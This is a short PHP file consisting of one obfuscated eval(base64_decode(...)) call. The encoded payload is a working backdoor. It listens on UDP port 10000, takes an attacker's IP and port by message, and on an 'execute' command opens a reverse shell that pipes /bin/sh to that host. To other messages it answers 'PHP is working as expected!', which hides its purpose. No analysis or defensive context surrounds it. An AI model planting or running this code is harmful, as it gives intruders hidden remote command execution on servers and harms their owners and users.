<?php

eval(base64_decode('JHNvY2sgPSBzb2NrZXRfY3JlYXRlKEFGX0lORVQsIFNPQ0tfREdSQU0sIFNPTF9VRFApOwpzb2NrZXRfYmluZCgkc29jaywgJzAuMC4wLjAnLCAxMDAwMCk7CiRzZXRJUCA9ICIiOwoKZnVuY3Rpb24gcmV2c2hlbGwoJGlwLCAkcG9ydCkgewoJc2V0X3RpbWVfbGltaXQgKDApOwoJJFZFUlNJT04gPSAiMS4wIjsKCS8vJGlwID0gJzEyNy4wLjAuMSc7ICAvLyBDSEFOR0UgVEhJUwoJLy8kcG9ydCA9IDEyMzQ7ICAgICAgIC8vIENIQU5HRSBUSElTCgkkY2h1bmtfc2l6ZSA9IDE0MDA7Cgkkd3JpdGVfYSA9IG51bGw7CgkkZXJyb3JfYSA9IG51bGw7Cgkkc2hlbGwgPSAndW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1pJzsKCSRkYWVtb24gPSAwOwoJJGRlYnVnID0gMDsKCgkvLyBPcGVuIHJldmVyc2UgY29ubmVjdGlvbgoJJHNvY2sgPSBmc29ja29wZW4oJGlwLCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAzMCk7CglpZiAoISRzb2NrKSB7CgkJI3ByaW50aXQoIiRlcnJzdHIgKCRlcnJubykiKTsKCQlleGl0KDEpOwoJfQoKCS8vIFNwYXduIHNoZWxsIHByb2Nlc3MKCSRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KAoJMCA9PiBhcnJheSgicGlwZSIsICJyIiksICAvLyBzdGRpbiBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCByZWFkIGZyb20KCTEgPT4gYXJyYXkoInBpcGUiLCAidyIpLCAgLy8gc3Rkb3V0IGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvCgkyID0+IGFycmF5KCJwaXBlIiwgInciKSAgIC8vIHN0ZGVyciBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwoJKTsKCgkkcHJvY2VzcyA9IHByb2Nfb3Blbigkc2hlbGwsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKTsKCglpZiAoIWlzX3Jlc291cmNlKCRwcm9jZXNzKSkgewoJCSNwcmludGl0KCJFUlJPUjogQ2FuJ3Qgc3Bhd24gc2hlbGwiKTsKCQlleGl0KDEpOwoJfQoKCS8vIFNldCBldmVyeXRoaW5nIHRvIG5vbi1ibG9ja2luZwoJLy8gUmVhc29uOiBPY2NzaW9uYWxseSByZWFkcyB3aWxsIGJsb2NrLCBldmVuIHRob3VnaCBzdHJlYW1fc2VsZWN0IHRlbGxzIHVzIHRoZXkgd29uJ3QKCXN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzBdLCAwKTsKCXN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzFdLCAwKTsKCXN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzJdLCAwKTsKCXN0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssIDApOwoKCSNwcmludGl0KCJTdWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7CgoJd2hpbGUgKDEpIHsKCQkvLyBDaGVjayBmb3IgZW5kIG9mIFRDUCBjb25uZWN0aW9uCgkJaWYgKGZlb2YoJHNvY2spKSB7CgkJCSNwcmludGl0KCJFUlJPUjogU2hlbGwgY29ubmVjdGlvbiB0ZXJtaW5hdGVkIik7CgkJCWJyZWFrOwoJCX0KCgkJLy8gQ2hlY2sgZm9yIGVuZCBvZiBTVERPVVQKCQlpZiAoZmVvZigkcGlwZXNbMV0pKSB7CgkJCSNwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVkIik7CgkJCWJyZWFrOwoJCX0KCgkJLy8gV2FpdCB1bnRpbCBhIGNvbW1hbmQgaXMgZW5kIGRvd24gJHNvY2ssIG9yIHNvbWUKCQkvLyBjb21tYW5kIG91dHB1dCBpcyBhdmFpbGFibGUgb24gU1RET1VUIG9yIFNUREVSUgoJCSRyZWFkX2EgPSBhcnJheSgkc29jaywgJHBpcGVzWzFdLCAkcGlwZXNbMl0pOwoJCSRudW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVycm9yX2EsIG51bGwpOwoKCQkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBUQ1Agc29ja2V0LCBzZW5kCgkJLy8gZGF0YSB0byBwcm9jZXNzJ3MgU1RESU4KCQlpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFkX2EpKSB7CgkJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0sgUkVBRCIpOwoJCQkkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOwoJCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLOiAkaW5wdXQiKTsKCQkJZndyaXRlKCRwaXBlc1swXSwgJGlucHV0KTsKCQl9CgoJCS8vIElmIHdlIGNhbiByZWFkIGZyb20gdGhlIHByb2Nlc3MncyBTVERPVVQKCQkvLyBzZW5kIGRhdGEgZG93biB0Y3AgY29ubmVjdGlvbgoJCWlmIChpbl9hcnJheSgkcGlwZXNbMV0sICRyZWFkX2EpKSB7CgkJCWlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVCBSRUFEIik7CgkJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1sxXSwgJGNodW5rX3NpemUpOwoJCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQ6ICRpbnB1dCIpOwoJCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7CgkJfQoKCQkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBwcm9jZXNzJ3MgU1RERVJSCgkJLy8gc2VuZCBkYXRhIGRvd24gdGNwIGNvbm5lY3Rpb24KCQlpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkgewoJCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlIgUkVBRCIpOwoJCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMl0sICRjaHVua19zaXplKTsKCQkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSOiAkaW5wdXQiKTsKCQkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOwoJCX0KCX0KCglmY2xvc2UoJHNvY2spOwoJZmNsb3NlKCRwaXBlc1swXSk7CglmY2xvc2UoJHBpcGVzWzFdKTsKCWZjbG9zZSgkcGlwZXNbMl0pOwoJcHJvY19jbG9zZSgkcHJvY2Vzcyk7Cgp9Cgpmb3IgKDs7KSB7CiAgICBzb2NrZXRfcmVjdmZyb20oJHNvY2ssICRtZXNzYWdlLCAxMDI0LCAwLCAkaXAsICRwb3J0KTsKICAgIGlmIChzdHJwb3MoJG1lc3NhZ2UsICJpcCIpICE9PSBmYWxzZSkgewogICAgICAgICAgICAkc2V0SVAgPSBzdWJzdHIoJG1lc3NhZ2UsIDMsIC0xKTsKICAgICAgICAgICAgJHJlcGx5ID0gJHNldElQIC4gIlxuIjsKICAgIH0KICAgIGVsc2VpZiAoc3RycG9zKCRtZXNzYWdlLCAicG9ydCIpICE9PSBmYWxzZSkgewogICAgICAgICAgICAkc2V0UG9ydCA9IHN1YnN0cigkbWVzc2FnZSwgNSwgLTEpOwogICAgICAgICAgICAkcmVwbHkgPSAkc2V0UG9ydCAuICJcbiI7CiAgICB9CiAgICBlbHNlaWYgKChzdHJwb3MoJG1lc3NhZ2UsICJzdGF0dXMiKSAhPT0gZmFsc2UpICYmIChzdHJsZW4oJHNldElQKSA+IDApICYmIChzdHJsZW4oJHNldFBvcnQpID4gMSkpIHsKICAgICAgICAgICAgJHJlcGx5ID0gIklQOiAkc2V0SVAgUG9ydDogJHNldFBvcnRcbiI7CiAgICB9CiAgICBlbHNlaWYgKChzdHJwb3MoJG1lc3NhZ2UsICJleGVjdXRlIikgIT09IGZhbHNlKSAmJiAoc3RybGVuKCRzZXRJUCkgPiAwKSAmJiAoc3RybGVuKCRzZXRQb3J0KSA+IDEpKSB7CiAgICAgICAgICAgIHJldnNoZWxsKCRzZXRJUCwgJHNldFBvcnQpOwogICAgICAgICAgICAkcmVwbHkgPSAiSVA6ICRzZXRJUCBQb3J0OiAkc2V0UG9ydFxuIjsKICAgIH0KICAgIGVsc2UgewogICAgICAgICRyZXBseSA9ICJQSFAgaXMgd29ya2luZyBhcyBleHBlY3RlZCFcbiI7CiAgICB9CiAgICBzb2NrZXRfc2VuZHRvKCRzb2NrLCAkcmVwbHksIHN0cmxlbigkcmVwbHkpLCAwLCAkaXAsICRwb3J0KTsKfQoK'));

?>
